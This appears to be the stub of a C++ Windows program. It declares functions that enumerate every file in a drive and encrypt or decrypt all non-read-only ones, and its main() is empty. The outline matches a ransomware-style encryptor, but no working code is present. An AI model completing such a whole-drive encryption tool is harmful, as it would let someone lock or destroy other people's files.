#pragma once
#include<Windows.h>
#include <iostream>
#include<filesystem>
#include<vector>
#include <atlstr.h>



void get_files(std::vector<std::filesystem::path>& paths, LPCTSTR root_path); //get all files in root dir
void fill_paths(std::vector<std::filesystem::path>& paths); // fill vector of paths with all full path in root dir
bool readonly_check(const std::vector<std::filesystem::path>& paths); // check readonly files in drive
DWORD encrypt(const std::vector<std::filesystem::path>& paths); // encrypt all non readonly file in drive
DWORD decrypt(const std::vector<std::filesystem::path>& paths); // decrypt all non readonly file in drive


int main()
{

}

